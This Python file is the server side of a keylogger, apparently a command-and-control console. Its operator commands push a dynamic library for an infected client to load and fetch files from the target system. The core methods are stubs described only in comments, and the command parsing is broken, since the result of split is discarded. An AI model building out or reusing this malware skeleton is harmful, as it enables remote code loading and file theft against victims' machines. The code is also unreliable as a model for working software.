from server.C2ManagerServer import C2Manager
from server.FileManagerServer import FileManager


class KeyloggerServer:

    def __init__(self):
        self.__C2Man = C2Manager()

    def RunServer(self):
        self.__WaitForUserCommand()

    def StopServer(self):
        pass

    def __WaitForUserCommand(self):
        try:
            while True:

                command = input()

                if len(command) < 1:
                    self.PrintWrongUsage()
                    continue

                if len(command) > 1:
                    command.split(" ")
                    path = command[1]
                    if command[0] == "SendDynamicLibrary":
                        self.__SendDynamicLib(path)
                        continue
                    if command[0] == "GetFile":
                        self.__ReadFileFromClient(path)
                        continue

                # command length is exactly 1
                if command == "exit":
                    self.StopServer()
                    continue

                if command == "usage":
                    self.Usage()
                    continue

                self.PrintWrongUsage()

        except KeyboardInterrupt:
            pass

    @staticmethod
    def Usage():
        print("""[~] Commands:
        1. exit - exit the server (think !)
        2. SendDynamicLibrary /path/to/dylib (backslash direction
        must be corresponding to the target system)
        3. GetFile /path/to/target_file (backslash direction
        must be corresponding to the target system
        4. Usage - this banner""")

    def PrintWrongUsage(self):
        print("[~] Wrong usage")
        print(self.Usage())

    def __SendDynamicLib(self, path):
        # 1. read file content
        # 2. send command to client - "load_dynamic_lib"
        # 2. send_file_content
        pass

    def __ReadFileFromClient(self, path):
        # 1. send command to client - "send_file"
        # 2. receive data from client
        # 3. write to filesystem
        pass
